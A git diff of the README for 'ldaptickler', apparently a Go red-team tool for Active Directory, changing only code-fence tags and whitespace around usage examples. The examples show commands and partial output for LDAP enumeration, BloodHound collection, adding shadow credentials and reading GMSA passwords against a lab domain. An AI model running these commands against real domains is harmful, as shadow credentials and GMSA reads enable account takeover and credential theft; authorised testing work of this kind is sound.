@@ -30,7 +30,7 @@ You'll need the latest copy of [golang](https://go.dev/dl/) installed.
 
 ## Linux
 
-```
+```bash
 export GOOS=windows
 or
 export GOOS=linux
@@ -42,7 +42,7 @@ or
 
 ## Windows
 
-```
+```powershell
 $Env:GOOS = "windows"
 or
 $Env:GOOS = "linux"
@@ -54,13 +54,13 @@ or
 
 ### Execute without compiling
 
-```
+```bash
 go run ./cmd/ldaptickler/ -s -u slacker -p --dc tip.spinninglikea.top  whoami
 ```
 
 ## Example Usage
 
-```
+```bash
 Usage:
 ldaptickler
 [OPTIONS] <arg>
@@ -199,15 +199,15 @@ AUTHORS
     Chris Hodson r2d2@sostup.id
 ```
 
-### Anonymous bind 
+### Anonymous bind
 
-```
+```bash
 -s = Skip cert verification
 --dc = Specify the domain controller
 whoami = run whoami as the action
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ -s --dc tip.spinninglikea.top  whoami
 [+] Attempting anonymous bind to tip.spinninglikea.top
 [+] Successfully connected to tip.spinninglikea.top
@@ -217,7 +217,7 @@ go run ./cmd/ldaptickler/ -s --dc tip.spinninglikea.top  whoami
 
 ### NTLM Bind
 
-```
+```bash
 -s = Skip cert verification
 -p = Prompt for password
 -d = Specify Domain(required for NLTM bind)
@@ -226,7 +226,7 @@ go run ./cmd/ldaptickler/ -s --dc tip.spinninglikea.top  whoami
 whoami = run whoami as the action
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ -s -u slacker -p -d spinninglikea.top --dc tip.spinninglikea.top  whoami
 [+] Enter Password:
 [+] Attempting NTLM bind to tip.spinninglikea.top
@@ -237,7 +237,7 @@ go run ./cmd/ldaptickler/ -s -u slacker -p -d spinninglikea.top --dc tip.spinnin
 
 ### Simple Bind
 
-```
+```bash
 -s = Skip cert verification
 -u = username, it may be necessary to pass the domain as well for example, domain\username
 -p = Prompt for password
@@ -245,7 +245,7 @@ go run ./cmd/ldaptickler/ -s -u slacker -p -d spinninglikea.top --dc tip.spinnin
 whoami = run whoami as the action
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ -s -u slacker -p  --dc tip.spinninglikea.top  whoami
 [+] Enter Password:
 [+] Attempting bind with credentials to tip.spinninglikea.top
@@ -256,7 +256,7 @@ go run ./cmd/ldaptickler/ -s -u slacker -p  --dc tip.spinninglikea.top  whoami
 
 ### List computers
 
-```
+```bash
 -d = Domain
 --dc = domain controller
  -s = Skip cert verification
@@ -265,7 +265,7 @@ go run ./cmd/ldaptickler/ -s -u slacker -p  --dc tip.spinninglikea.top  whoami
  computer = List all computer objects
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top  -s -u lowprivguy -p computers
 [+] Enter Password:
 [+] Attempting NTLM bind to tip.spinninglikea.top
@@ -275,7 +275,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top  -s -u
 
 ### List users
 
-```
+```bash
 -d = Domain
 -g = Enable GSSAPI
 --dc = Specify DC
@@ -284,7 +284,8 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top  -s -u
 -p = Prompt for password
 users = query users in LDAP
 ```
-```
+
+```bash
 go run ./cmd/ldaptickler/ -d targetdomain.com -g --dc tip.spinninglikea.top  -s -u lowprivguy -p users
 [+] Enter Password:
 [+] Attempting GSSAPI bind to tip.spinninglikea.top
@@ -294,7 +295,7 @@ go run ./cmd/ldaptickler/ -d targetdomain.com -g --dc tip.spinninglikea.top  -s 
 
 ### Search with custom filter
 
-```
+```bash
 --dc = Specify DC
 -s = Skip cert verification
 -u = username
@@ -302,7 +303,7 @@ go run ./cmd/ldaptickler/ -d targetdomain.com -g --dc tip.spinninglikea.top  -s 
 users = query users in LDAP
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ --dc tip.spinninglikea.top  -s -u lowprivguy  -p search "(&(samaccountname=Cert Publishers)(member=*))" 
 [+] Enter Password:
 [+] Attempting bind with credentials to tip.spinninglikea.top
@@ -312,7 +313,7 @@ go run ./cmd/ldaptickler/ --dc tip.spinninglikea.top  -s -u lowprivguy  -p searc
 
 ### Bloodhound collector support
 
-```
+```bash
 -d = specify the domain
 --dc = specify the domain controller
 -p = prompt for password
@@ -320,7 +321,7 @@ go run ./cmd/ldaptickler/ --dc tip.spinninglikea.top  -s -u lowprivguy  -p searc
 -s = skip cert verification
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p collectbh
 [+] Enter Password: 
 [+] Attempting NTLM bind to tip.spinninglikea.top
@@ -331,7 +332,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
 
 ### Adding shadow credentials
 
-```
+```bash
 -d = specify the domain
 --dc = specify the domain controller
 -p = prompt for password
@@ -339,7 +340,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
 -s = skip cert verification
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p addshadowcredential slacker
 [+] Enter Password: 
 [+] Attempting NTLM bind to tip.spinninglikea.top
@@ -368,7 +369,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
 
 ### Disable shadow credentials
 
-```
+```bash
 -d = specify the domain
 --dc = specify the domain controller
 -p = prompt for password
@@ -376,7 +377,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
 -s = skip cert verification
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p disableshadowcredential slacker
 [+] Enter Password: 
 [+] Attempting NTLM bind to tip.spinninglikea.top
@@ -387,7 +388,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
 
 ### Read GMSA credentials, if privileged they will display
 
-```
+```bash
 -d = specify the domain
 --dc = specify the domain controller
 -p = prompt for password
@@ -395,7 +396,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
 -s = skip cert verification
 ```
 
-```
+```bash
 go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p gmsaaccounts                   
 [+] Enter Password: 
 [+] Attempting NTLM bind to tip.spinninglikea.top
@@ -405,7 +406,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
 
 ### Socks proxy example
 
-```
+```bash
 -d = specify the domain
 --dc = specify the domain controller
 -p = prompt for password
@@ -414,7 +415,7 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
 --proxy = specify socks5 proxy
 ```
 
-```
+```bash
 strace -e connect ./ldaptickler --proxy socks5://127.0.0.1:8000 --dc tip.spinninglikea.top -s -d spinninglikea.top -basedn DC=spinninglikea,DC=top -u slacker -p computers
 --- SIGURG {si_signo=SIGURG, si_code=SI_TKILL, si_pid=99603, si_uid=1000} ---
 --- SIGURG {si_signo=SIGURG, si_code=SI_TKILL, si_pid=99603, si_uid=1000} ---
